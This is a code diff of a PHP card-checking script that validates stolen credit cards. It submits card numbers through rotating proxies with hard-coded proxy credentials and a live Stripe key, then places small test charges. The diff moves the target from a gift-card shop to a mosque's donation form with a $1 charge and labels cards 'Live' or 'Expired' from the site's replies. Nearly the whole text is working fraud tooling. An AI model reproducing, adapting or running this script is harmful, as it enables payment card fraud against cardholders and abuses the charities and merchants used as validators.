@@ -47,8 +47,8 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
-$username = "g7305bhx467p4yl";
-$password = "ugv0ew3w009j5ii";
+$username = "9wrfxdsc2517ipu";
+$password = "icse7pfhwom5bqt";
 $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
@@ -82,20 +82,20 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=58944b83-940f-434f-aa2d-18bebf226605ea4e98&sid=9b61583e-db16-404a-95e0-38b2e29e8074d026b2&pasted_fields=number&payment_user_agent=stripe.js%2F737366135d%3B+stripe-js-v3%2F737366135d%3B+card-element&referrer=https%3A%2F%2Fmackenthuns.com&time_on_page=102020&key=pk_live_42NAQdWsJvsYYuNdjfeIiPi3SHHkzUVMTFavfvAQT60ZIMUEa6s12SNesga9nDNoikbDJt9h9en9fLFfvAjB0EAIJ009IitWhj9');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=53babbbd-b2ee-4f2d-96d8-4b34f33fcf02a7f0cd&sid=e8519a2a-15e4-4873-94db-d9baf395df20635077&pasted_fields=number&payment_user_agent=stripe.js%2F646ed0258c%3B+stripe-js-v3%2F646ed0258c%3B+card-element&referrer=https%3A%2F%2Fwww.masjidibraaheem.com&time_on_page=113794&key=pk_live_51P7OxtIVgJkbRDSg63nyhPEv5KLfmGWFwnHOIEUXeEp9YTT3eMnYIn0nT5aFfyA8SMnp0AikeQNJhoEhea1WTnNQ00Vse9NVKA');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 # -------------------- [2 REQ] -------------------#
 
-$username = "g7305bhx467p4yl";
-$password = "ugv0ew3w009j5ii";
+$username = "9wrfxdsc2517ipu";
+$password = "icse7pfhwom5bqt";
 $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://mackenthuns.com/wp-admin/admin-ajax.php?t=1713420038247');
+curl_setopt($ch, CURLOPT_URL, 'https://www.masjidibraaheem.com/wp-admin/admin-ajax.php?t=1713953796562');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +110,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1713420038247 h2',
-'Host: mackenthuns.com',
+'POST /wp-admin/admin-ajax.php?t=1713953796562 h2',
+'Host: www.masjidibraaheem.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://mackenthuns.com',
+'origin: https://www.masjidibraaheem.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://mackenthuns.com/gift-card/',
+'referer: https://www.masjidibraaheem.com/donate/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D10027%26_fluentform_9_fluentformnonce%3D884ccc8b3e%26_wp_http_referer%3D%252Fgift-card%252F%26payment_input%3D25%26item-quantity%3D%26payment_input_1%3D50%26item-quantity_1%3D%26payment_input_2%3D100%26item-quantity_2%3D%26payment_input_3%3D2.99%26dropdown%3DMinnetrista%26input_text%3DGloo%26input_text_1%3DSmoke%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26description%3D%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dgloosmoke%2540gmail.com%26phone%3D%26payment_method%3Dstripe%26__entry_intermediate_hash%3D55fe9585c3fdb1d2f87fa81489e7192d%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=9');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D930%26_fluentform_7_fluentformnonce%3D5f71cac6b5%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__entry_intermediate_hash%3D7eb98df9b5dad9ce675955b6bd23fdea%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=7');
 
 $result2a = curl_exec($ch);
 $dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
@@ -196,9 +196,9 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'Thank you for your message.')){
+elseif (strpos($result2a, 'Jazakumullahu Khairan for your donation!')){
   $status = "Live 🟢";
-$response = "CCN 3$ ✅";
+$response = "CCN 1$ ✅";
 
   }
 
